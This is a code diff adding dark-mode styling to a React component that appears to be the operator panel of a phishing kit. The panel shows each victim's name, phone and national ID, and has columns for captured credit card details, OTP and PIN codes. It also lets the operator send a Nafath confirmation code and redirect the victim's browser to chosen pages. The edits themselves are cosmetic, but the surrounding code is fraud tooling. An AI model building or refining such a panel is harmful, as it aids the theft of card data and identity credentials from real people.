@@ -37,9 +37,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
   if (!visitor) {
     return (
-      <div className="flex flex-1 items-center justify-center bg-slate-50/40">
-        <div className="rounded-2xl border border-dashed border-slate-300 bg-white/70 px-8 py-10 text-center shadow-sm">
-          <p className="text-lg font-semibold text-slate-600">اختر زائراً لعرض التفاصيل</p>
+      <div className="flex flex-1 items-center justify-center bg-slate-50/40 dark:bg-slate-950/40">
+        <div className="rounded-2xl border border-dashed border-slate-300 bg-white/70 px-8 py-10 text-center shadow-sm dark:border-slate-700 dark:bg-slate-900/70">
+          <p className="text-lg font-semibold text-slate-600 dark:text-slate-300">اختر زائراً لعرض التفاصيل</p>
         </div>
       </div>
     );
@@ -465,7 +465,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             value={nafadCode}
             onChange={(e) => setNafadCode(e.target.value)}
             placeholder="أدخل رقم التأكيد"
-            className="flex-1 rounded-lg border border-slate-300 bg-white px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200"
+            className="flex-1 rounded-lg border border-slate-300 bg-white px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200 dark:border-slate-600 dark:bg-slate-800 dark:text-slate-100 dark:placeholder:text-slate-400 dark:focus:border-blue-400 dark:focus:ring-blue-900/70"
           />
           <button
             onClick={handleSendNafadCode}
@@ -660,27 +660,27 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   };
 
   return (
-    <div className="flex flex-1 flex-col overflow-hidden bg-transparent">
+    <div className="flex flex-1 flex-col overflow-hidden bg-transparent text-slate-900 dark:text-slate-100">
       {/* Header */}
-      <div className="border-b border-slate-200/80 bg-white/85 p-4 shadow-sm backdrop-blur md:p-6">
+      <div className="border-b border-slate-200/80 bg-white/85 p-4 shadow-sm backdrop-blur dark:border-slate-700/80 dark:bg-slate-900/85 md:p-6">
         <div className="flex flex-wrap items-start justify-between gap-3">
           <div>
-            <h2 className="text-xl font-extrabold text-slate-900 md:text-2xl">
+            <h2 className="text-xl font-extrabold text-slate-900 dark:text-slate-100 md:text-2xl">
               {visitor.ownerName || "زائر جديد"}
             </h2>
 
             {/* Contact Info */}
             <div className="flex flex-col gap-1 mt-2">
               <div className="flex items-center gap-4 text-sm">
-                <span className="rounded-lg bg-slate-100 px-2.5 py-1 text-slate-700">
+                <span className="rounded-lg bg-slate-100 px-2.5 py-1 text-slate-700 dark:bg-slate-800 dark:text-slate-300">
                   📞{" "}
-                  <span className="font-semibold text-slate-900">
+                  <span className="font-semibold text-slate-900 dark:text-slate-100">
                     {visitor.phoneNumber || "غير محدد"}
                   </span>
                 </span>
-                <span className="rounded-lg bg-slate-100 px-2.5 py-1 text-slate-700">
+                <span className="rounded-lg bg-slate-100 px-2.5 py-1 text-slate-700 dark:bg-slate-800 dark:text-slate-300">
                   🆔{" "}
-                  <span className="font-semibold text-slate-900">
+                  <span className="font-semibold text-slate-900 dark:text-slate-100">
                     {visitor.identityNumber || "غير محدد"}
                   </span>
                 </span>
@@ -700,7 +700,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
-                <div className="flex items-center gap-2 text-xs text-slate-500">
+                <div className="flex items-center gap-2 text-xs text-slate-500 dark:text-slate-400">
                   {visitor.country && <span>🌍 {visitor.country}</span>}
                   {visitor.browser && (
                     <>
@@ -763,7 +763,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             <select
               onChange={(e) => handleNavigate(e.target.value)}
               disabled={isNavigating}
-              className="rounded-xl border border-slate-300 bg-white px-4 py-2 text-sm text-slate-700 shadow-sm transition focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200 disabled:opacity-50"
+              className="rounded-xl border border-slate-300 bg-white px-4 py-2 text-sm text-slate-700 shadow-sm transition focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200 disabled:opacity-50 dark:border-slate-600 dark:bg-slate-800 dark:text-slate-100 dark:focus:border-blue-400 dark:focus:ring-blue-900/70"
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">الصفحة الرئيسية</option>
@@ -785,7 +785,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       {/* Bubbles */}
       <div className="flex-1 overflow-y-auto p-3 md:p-6">
         {sortedBubbles.length === 0 ? (
-          <div className="py-12 text-center text-slate-500">
+          <div className="py-12 text-center text-slate-500 dark:text-slate-400">
             <p>لا توجد بيانات لعرضها</p>
           </div>
         ) : (
@@ -794,7 +794,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             dir="rtl"
           >
             {/* Right Column - Credit Card and Card Details */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-slate-200 lg:pl-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-slate-200 lg:pl-6 dark:lg:border-slate-700">
               {sortedBubbles
                 .filter(
                   (b) => b.id.startsWith("card-info") || b.id === "card-details"
@@ -906,7 +906,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-slate-200 lg:px-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-slate-200 lg:px-6 dark:lg:border-slate-700">
               {sortedBubbles
                 .filter(
                   (b) =>
